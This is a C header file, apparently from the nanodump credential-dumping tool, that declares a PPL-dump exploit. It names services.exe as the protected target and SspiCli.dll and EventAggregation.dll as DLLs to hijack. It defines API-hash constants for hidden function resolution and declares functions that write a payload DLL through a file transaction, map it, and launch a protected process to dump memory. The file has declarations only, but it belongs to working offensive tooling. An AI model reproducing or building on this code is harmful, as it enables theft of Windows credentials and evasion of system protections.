#pragma once

#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <memory.h>
#include <aclapi.h>

#include "nanodump.h"
#include "utils.h"
#include "dinvoke.h"
#include "syscalls.h"
#include "token_priv.h"
#include "impersonate.h"
#include "ppl/ppl_utils.h"

#define PPL_BINARY L"services.exe"
#define DLL_TO_HIJACK_WIN63 L"SspiCli.dll"
#define DLL_TO_HIJACK_WIN10 L"EventAggregation.dll"
#define DLL_LINK_TARGET L"foobar"

typedef BOOL(WINAPI* DllMain_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
typedef BOOL(WINAPI* CopySid_t) (DWORD nDestinationSidLength, PSID pDestinationSid, PSID pSourceSid);
typedef BOOL(WINAPI* ConvertSidToStringSidW_t) (PSID Sid, LPWSTR *StringSid);
typedef BOOL(WINAPI* ConvertStringSidToSidW_t) (LPCWSTR StringSid, PSID *Sid);
typedef BOOL(WINAPI* LookupAccountSidW_t) (LPCWSTR lpSystemName, PSID Sid, LPWSTR Name, LPDWORD cchName, LPWSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
typedef BOOL(WINAPI* InitializeSecurityDescriptor_t) (PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
typedef BOOL(WINAPI* SetSecurityDescriptorDacl_t) (PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted);
typedef BOOL(WINAPI* SetKernelObjectSecurity_t) (HANDLE Handle, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR SecurityDescriptor);
typedef BOOL(WINAPI* RevertToSelf_t) (VOID);
typedef BOOL(WINAPI* DefineDosDeviceW_t) (DWORD dwFlags, LPCWSTR lpDeviceName, LPCWSTR lpTargetPath);
typedef BOOL(WINAPI* CreateProcessAsUserW_t) (HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef HANDLE(WINAPI* CreateFileTransactedW_t) (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile, HANDLE hTransaction, PUSHORT pusMiniVersion, PVOID lpExtendedParameter);
typedef DWORD(WINAPI* GetSecurityInfo_t) (HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID* ppsidOwner, PSID* ppsidGroup, PACL* ppDacl, PACL* ppSacl, PSECURITY_DESCRIPTOR* ppSecurityDescriptor);
typedef UINT(WINAPI* GetSystemDirectoryW_t) (LPWSTR lpBuffer, UINT uSize);
typedef BOOL(WINAPI* FindClose_t) (HANDLE hFindFile);
typedef HANDLE(WINAPI* FindFirstFileW_t) (LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
typedef BOOL(WINAPI* FindNextFileW_t) (HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);

#define CopySid_SW2_HASH 0xE9DEE47F
#define ConvertSidToStringSidW_SW2_HASH 0x2E89B34F
#define ConvertStringSidToSidW_SW2_HASH 0x9A0697A4
#define LookupAccountSidW_SW2_HASH 0x093E752B
#define InitializeSecurityDescriptor_SW2_HASH 0x0388211D
#define SetSecurityDescriptorDacl_SW2_HASH 0x7BDD4356
#define SetKernelObjectSecurity_SW2_HASH 0x06AE0E20
#define RevertToSelf_SW2_HASH 0x93BC9622
#define DefineDosDeviceW_SW2_HASH 0xCB970704
#define CreateProcessAsUserW_SW2_HASH 0x33A5532B
#define CreateFileTransactedW_SW2_HASH 0x968D0D41
#define GetSecurityInfo_SW2_HASH 0x7D3F55E4
#define FindClose_SW2_HASH 0xD2503ADD
#define GetSystemDirectoryW_SW2_HASH 0x008D32E6
#define FindFirstFileW_SW2_HASH 0x8EDA41FA
#define FindNextFileW_SW2_HASH 0xBF0C31DB

BOOL run_ppl_dump_exploit(
    IN unsigned char nanodump_ppl_dump_dll[],
    IN unsigned int nanodump_ppl_dump_dll_len,
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL duplicate_handle);

BOOL create_protected_process_as_user(
    IN HANDLE hToken,
    IN LPWSTR pwszCommandLine,
    OUT PHANDLE phProcess);

BOOL prepare_ppl_command_line(
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL duplicate_handle,
    OUT LPWSTR* command_line);

BOOL find_file_for_transaction(
    IN DWORD dwMinSize,
    OUT LPWSTR* ppwszFilePath);

BOOL write_payload_dll_transacted(
    IN unsigned char nanodump_ppl_dump_dll[],
    IN unsigned int nanodump_ppl_dump_dll_len,
    OUT PHANDLE pdhFile,
    OUT PHANDLE phTransaction);

BOOL map_dll(
    IN unsigned char nanodump_ppl_dump_dll[],
    IN unsigned int nanodump_ppl_dump_dll_len,
    IN LPWSTR pwszSectionName,
    OUT PHANDLE phSection,
    OUT PHANDLE phTransaction);

BOOL check_ppl_requirements(VOID);

BOOL get_hijackeable_dllname(
    OUT LPWSTR* ppwszDllName);
